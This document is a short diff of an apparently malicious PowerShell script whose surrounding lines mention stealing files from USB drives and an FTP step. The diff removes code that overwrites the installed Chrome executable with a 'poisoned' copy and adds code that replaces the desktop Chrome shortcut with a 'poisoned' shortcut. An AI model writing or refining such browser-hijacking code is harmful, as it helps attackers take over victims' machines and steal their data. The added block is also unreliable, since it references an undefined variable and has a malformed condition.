@@ -49,11 +49,12 @@ If ($steal_files_usb -eq 'yes') {
 
 # Alright FTP time!
 
-# .exe Section (hella long)
-If ($poison_chrome -eq 'yes') {
-  $chrome_location="C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
-  $poisoned_chrome_location="$PSScriptRoot\chrome.exe"
-  robocopy $poisoned_chrome_location $chrome_location /S /MT /Z
+# Real shortcut section
+
+If (Test-Path "$Env:UserProfile\Desktop\Google Chrome.lnk" -eq True) {
+  $chrome_lnk="$Env:UserProfile\Desktop\Google Chrome.lnk"
+  $poisoned_chrome="$PSScriptRoot\Google Chrome.lnk"
+  robocopy $poison_chrome $chrome_lnk /S /MT /Z
 }
 
 
